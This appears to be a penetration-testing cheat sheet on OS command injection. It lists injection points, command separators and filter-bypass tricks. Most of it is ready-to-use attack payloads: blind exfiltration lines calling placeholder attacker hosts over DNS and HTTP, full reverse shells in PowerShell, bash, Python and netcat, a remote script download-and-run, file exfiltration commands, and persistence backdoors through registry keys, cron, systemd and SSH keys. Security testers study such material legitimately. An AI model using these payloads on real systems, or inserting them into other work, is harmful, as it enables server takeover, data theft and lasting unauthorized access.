# OS Command Injection

OS Command Injection vulnerabilities allow attackers to execute arbitrary system commands on web servers, leading to complete system compromise, data exfiltration, and persistent backdoor access.

---

## Common Injection Points

```
# URL parameters
?file=document.pdf
?path=/var/www/html
?cmd=ping
?ip=192.168.1.1
?host=example.com

# POST parameters
filename=report.txt
directory=/uploads
command=backup
target=server01
```

### Target Functionalities

- File operations (upload, download, delete)
- Network utilities (ping, traceroute, nslookup)
- System administration (backup, logs, monitoring)
- Git operations (clone, pull, push)
- Image processing (resize, convert, compress)

---

## Command Separators & Operators

### Universal Separators

```bash
; whoami          # Semicolon
| whoami          # Pipe
&& whoami         # AND operator
|| whoami         # OR operator
& whoami          # Background execution
```

### Windows-Specific

```cmd
& whoami          # Single ampersand (CMD)
| whoami          # Pipe
`whoami`          # Command substitution
```

### Linux-Specific

```bash
$(whoami)         # Command substitution
`whoami`          # Backticks
%0A whoami        # Newline injection
%0D%0A whoami     # CRLF injection
```

---

## Basic Detection Commands

### Windows

```cmd
; whoami
; hostname
; systeminfo
; ipconfig
; ipconfig /all
; netstat -an
; dir C:\
; type C:\Windows\System32\drivers\etc\hosts
```

### Linux

```bash
; whoami
; id
; uname -a
; cat /etc/passwd
; ifconfig
; ip addr
; netstat -tulpn
; ls -la
; pwd
```

### URL Encoding Reference

```
%3B = ;
%26 = &
%7C = |
%20 = space
%0A = newline
%0D = carriage return
%253B = %3B (double encoded semicolon)
%2526 = %26 (double encoded ampersand)
```

---

## Filter Bypass Techniques

### Keyword Filtering Bypasses

```bash
# Case manipulation
WHOAMI, WhOaMi, wHoAmI

# Character insertion
who'ami, who"ami, who\ami

# Variable expansion (Linux)
$USER, ${USER}, $HOME

# Environment variables (Windows)
%USERNAME%, %COMPUTERNAME%

# Command alternatives
# Instead of 'cat': less, more, head, tail, nl, od
# Instead of 'ls': dir, find, locate, echo *
# Instead of 'whoami': id, $USER, %USERNAME%
```

### Space Filtering Bypasses

```bash
# Tab character
%09whoami

# Internal Field Separator (Linux)
${IFS}whoami
cat${IFS}/etc/passwd

# Brace expansion
{cat,/etc/passwd}

# Redirection
<whoami
cat</etc/passwd

# Variable assignment
X=$'cat\x20/etc/passwd';$X
```

### Command Obfuscation

```bash
# Base64 encoding (Linux)
echo "d2hvYW1p" | base64 -d | bash
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh

# Hex encoding
echo -e "\x77\x68\x6f\x61\x6d\x69"

# Octal encoding
$(printf "\167\150\157\141\155\151")

# PowerShell encoding (Windows)
powershell -enc dwBoAG8AYQBtAGkA
```

---

## Blind Command Injection

### Time-Based Detection

```bash
; sleep 10
; ping -c 10 127.0.0.1
; timeout 10
```

### DNS Exfiltration

```bash
; nslookup $(whoami).attacker.com
; dig $(id).evil.com
```

### HTTP Exfiltration

```bash
; curl http://ATTACKER_IP/$(whoami)
; wget http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)
```

### Out-of-Band Detection

```bash
# HTTP callbacks
; curl http://COLLABORATOR/$(whoami)

# DNS callbacks
; nslookup test.COLLABORATOR
; host $(whoami).evil.com

# ICMP callbacks
; ping -c 1 ATTACKER_IP
```

---

## Reverse Shell Payloads

### Windows - PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Windows - Powercat

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://ATTACKER_IP/powercat.ps1");powercat -c ATTACKER_IP -p 4444 -e powershell
```

### Linux - Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

### Linux - Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Linux - Netcat

```bash
# With -e flag
nc -e /bin/sh ATTACKER_IP 4444

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

---

## Data Exfiltration

### Windows

```cmd
# PowerShell web upload
powershell "(New-Object System.Net.WebClient).UploadFile('http://ATTACKER_IP:8000/upload', 'C:\sensitive.txt')"

# Base64 exfiltration
powershell "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\sensitive.txt'))"

# SMB exfiltration
copy C:\sensitive.txt \\ATTACKER_IP\share\
```

### Linux

```bash
# HTTP POST exfiltration
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP:8000/upload

# Base64 HTTP exfiltration
curl -d "data=$(cat /etc/passwd | base64)" http://ATTACKER_IP:8000/

# DNS exfiltration
for line in $(cat /etc/passwd | base64 | tr -d '\n' | fold -w 32); do nslookup $line.evil.com; done

# Netcat file transfer
cat /etc/passwd | nc ATTACKER_IP 4444
```

### Database Exfiltration

```bash
mysqldump -u root -p database_name > /tmp/dump.sql
pg_dump -U postgres database_name > /tmp/dump.sql
sqlite3 database.db .dump > /tmp/dump.sql
```

---

## Advanced WAF/Filter Evasion

```bash
# Unicode encoding
%u0077%u0068%u006f%u0061%u006d%u0069

# Hex encoding
\x77\x68\x6f\x61\x6d\x69

# Concatenation
who'a'mi
who"a"mi
who\ami

# Variable substitution (Linux)
w$@ho$@ami
who$()ami
```

---

## Persistence Mechanisms

### Windows

```cmd
# Registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "powershell -WindowStyle Hidden -File C:\Windows\Temp\backdoor.ps1"

# Scheduled task
schtasks /create /tn "Update" /tr "powershell -WindowStyle Hidden -File C:\Windows\Temp\backdoor.ps1" /sc onlogon

# Service creation
sc create "Service" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
```

### Linux

```bash
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -

# SSH authorized keys
mkdir -p ~/.ssh; echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
```

---

## Privilege Escalation After Injection

### Windows

```cmd
systeminfo
whoami /priv
whoami /groups
net user
net localgroup administrators
sc query
schtasks /query /fo LIST /v
```

### Linux

```bash
id
sudo -l
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null | grep -v proc
uname -a
cat /etc/crontab
ls -la /etc/cron*
```

---

## Real-World Injection Examples

### Ping Command

```bash
# Vulnerable code: system("ping -c 4 " + userInput)
127.0.0.1; cat /etc/passwd
127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
```

### Git Clone

```bash
# Vulnerable code: system("git clone " + userInput)
https://github.com/test/repo.git; whoami
```

### File Processing

```bash
# Vulnerable code: system("convert " + filename + " output.jpg")
input.jpg; wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

### Backup Script (tar wildcard injection)

```bash
# Vulnerable code: system("tar -czf backup.tar.gz " + directory)
/var/www/html --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

---

## Argument / Option Injection

Even without a shell metacharacter, you can inject **extra CLI flags** into a trusted binary to gain file write/read or RCE:

```bash
# curl: write attacker-controlled output to a file (-o) or read local (file://)
filename=" -o /var/www/html/shell.php https://attacker/shell.txt"
url="file:///etc/passwd"
# tar: --checkpoint-action / wildcard injection
*  --checkpoint=1  --checkpoint-action=exec=sh\ shell.sh
# wget: --output-document / --post-file exfil
" --post-file=/etc/passwd http://attacker/"
# git: -c core.sshCommand / ext:: / upload-pack injection
"ext::sh -c 'id'"   "-u./payload"
# ffmpeg / convert / zip / rsync (-e) — many GTFOBins-style flags
# find: -exec
" -exec sh -c id \;"
```

> Check **GTFOBins** for the binary in scope — many "safe" tools have a flag that yields read/write/exec.

---

## Advanced Linux Bash Obfuscation (WAF/keyword evasion)

```bash
# Brace / glob expansion (no spaces, no literal cmd name)
{cat,/etc/passwd}
/???/c?t /???/p??swd
/bin/c\at /e?c/p?sswd
$(rev<<<'di')              # -> id   (reverse)
$(printf '\151\144')       # -> id   (octal)
$(tr '[A-Z]' '[a-z]'<<<'ID')
c$@at /etc/pa$@sswd        # $@ expands to nothing
who$()ami     w\ho\am\i    'wh'o'am'i    "wh"o"am"i
$(echo aWQ=|base64 -d)     # -> id
$IFS / ${IFS} / $'\t' / <space-alternatives>
cat${IFS}/etc/passwd       cat$IFS$9/etc/passwd
# Newline / CRLF injection (when only one arg allowed)
%0a id     %0d%0a id
# Bash arithmetic / parameter expansion to build strings
x=cat;y=/etc/passwd;$x $y
echo ${PATH:0:1}           # -> /  (build paths from env)
```

---

## Blind / Out-of-Band (deep)

```bash
# DNS exfil one char/chunk at a time (no egress HTTP needed)
nslookup $(whoami).ATTACKER.oast.fun
nslookup `id|base64|tr -d '=+/'|head -c60`.ATTACKER.oast.fun
host $(cat /etc/passwd|head -1|base64).ATTACKER.oast.fun

# Time-based boolean oracle (no output, no OOB)
if [ $(whoami|cut -c1) = r ]; then sleep 5; fi
$(if id|grep -q root;then sleep 5;fi)

# Force output to a web-readable file then fetch it
id > /var/www/html/out.txt ; curl http://TARGET/out.txt
```

Use **interactsh** / Burp Collaborator for the OOB channel; DNS works even when HTTP egress is firewalled.

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite (+ Collaborator) | Intercept/modify; OOB blind confirmation |
| **commix** | Automated command-injection detection & exploitation |
| **GTFOBins** | Find argument-injection / privilege primitives per binary |
| curl | Manual command injection testing |
| Netcat | Reverse shell listeners |
| PowerShell / Powercat | Windows command execution and reverse shells |

```bash
# commix
commix -u "http://TARGET/page?ip=127.0.0.1" --level=3
commix -r request.txt --os-shell
```

---

## References

- PortSwigger — OS command injection: https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings — Command Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/
- PayloadsAllTheThings — Argument Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/Argument%20Injection/
- HackTricks — Command injection: https://hacktricks.wiki/en/pentesting-web/command-injection.html
- GTFOBins: https://gtfobins.github.io/
- OWASP Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- commix: https://github.com/commixproject/commix
